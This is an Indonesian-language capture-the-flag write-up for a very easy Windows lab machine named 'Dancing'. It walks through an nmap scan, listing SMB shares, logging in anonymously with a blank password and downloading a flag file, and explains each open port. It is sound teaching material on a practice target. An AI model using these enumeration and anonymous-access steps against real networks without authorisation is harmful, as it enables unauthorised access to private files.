# Dancing

## Basic Information

- Machine : Dancing
- Difficulty : Very Easy
- OS : Windows
- IP Address : 10.129.1.12

---

# Objective

Mempelajari dasar SMB (Server Message Block), melakukan enumerasi SMB share, mengakses share tanpa password, dan mengambil file dari Windows file server.

---

# Enumeration

## 1. Nmap Scan

Command:

```bash
nmap -Pn -sV 10.129.1.12 | tee nmap.txt
```

Result:

```
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5985/tcp open  http Microsoft HTTPAPI
```

---

# Service Analysis

## Port 135 - MSRPC

Microsoft Remote Procedure Call.

Digunakan Windows untuk komunikasi antar service.

---

## Port 139 - NetBIOS

Protokol lama Windows untuk network discovery dan file sharing.

---

## Port 445 - SMB

Service utama yang digunakan pada mesin ini.

SMB (Server Message Block) digunakan untuk:

- File sharing
- Printer sharing
- Windows network resources

---

## Port 5985 - WinRM

Windows Remote Management.

Biasanya digunakan untuk remote administration Windows.

---

# SMB Enumeration

Melihat SMB shares:

```bash
smbclient -L 10.129.1.12
```

Result:

```
Sharename       Type

ADMIN$          Disk
C$              Disk
IPC$            IPC
WorkShares      Disk
```

---

# SMB Access

Share yang dapat diakses:

```
WorkShares
```

Login menggunakan blank password:

```bash
smbclient //10.129.1.12/WorkShares -U ""
```

Password:

```
(empty)
```

Berhasil masuk:

```
smb: \>
```

---

# SMB Navigation

Melihat isi directory:

```text
ls
```

Result:

```
Amy.J
James.P
```

Masuk ke folder:

```text
cd James.P
```

Melihat file:

```text
ls
```

Result:

```
flag.txt
```

---

# Download File

Mengambil file dari SMB server:

```text
get flag.txt
```

File berhasil disimpan ke komputer lokal.

---

# Flag

```
<FLAG>
```

---

# SMB Commands Learned

| Command | Function |
|---------|----------|
| ls | Melihat isi directory |
| cd | Berpindah folder |
| get | Download file |
| put | Upload file |
| exit | Keluar dari SMB shell |

---

# Important Concepts

## SMB Share

SMB share adalah folder/resource yang dibagikan melalui jaringan Windows.

Contoh perusahaan:

```
Windows File Server

├── Public
├── HR
├── Finance
└── Development
```

User yang memiliki permission dapat mengakses folder tersebut.

---

## Anonymous Access

Pada mesin ini SMB mengizinkan akses tanpa username/password.

Hal seperti ini bisa menjadi risiko keamanan jika terjadi pada jaringan perusahaan.

---

# Lessons Learned

- Selalu lakukan enumerasi sebelum mencoba eksploitasi.
- Port 445 biasanya mengarah ke SMB.
- `smbclient` digunakan untuk berinteraksi dengan SMB server.
- Tidak semua share yang terlihat dapat diakses.
- Permission dan konfigurasi SMB sangat penting dalam keamanan Windows.
- Tool berbeda memiliki shell berbeda (`ftp>` dan `smb: \>`), sehingga command Linux seperti `cat` tidak bisa langsung digunakan di dalamnya.

---

# Methodology

```
Reconnaissance
      |
      v
Nmap Scan
      |
      v
Identify Service
      |
      v
SMB Enumeration
      |
      v
Access Share
      |
      v
Download File
      |
      v
Capture Flag
```
